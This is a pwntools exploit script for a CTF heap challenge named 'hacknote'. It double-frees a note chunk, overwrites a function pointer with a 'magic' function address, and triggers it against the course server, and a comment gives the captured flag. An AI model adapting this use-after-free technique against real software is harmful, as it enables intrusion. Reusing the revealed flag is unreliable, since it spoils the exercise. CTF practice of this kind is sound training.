#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{YOUSHOULDTAKEnote~}

context.arch = 'amd64'

e = ELF('./hacknote-77d489a4ae9b76323ce9a09a95d29c01607965d8')

host , port = 'csie.ctf.tw' , 10137

y = remote(host,port)


def add( size , data ):
    y.sendafter( 'ice :' , '1' )
    y.sendafter( 'e :' , str( size ) )
    y.sendafter( 't :' , data )

def sho( idx ):
    y.sendafter( 'ice :' , '3' )
    y.sendlineafter( 'x :' , str( idx ) )

def dle( idx ):
    y.sendafter( 'ice :' , '2' )
    y.sendafter( 'x :' , str( idx ) )


magic = 0x400c23

add( 0x10 , 'A' * 0x10 )

dle( 0 ) # double free
dle( 0 )

add( 0x70 , 'B' * 0x70 ) 
add( 0x10 , p64( magic ) ) # function pinter -> magic function

sho( 1 ) # trigger magic function

y.interactive()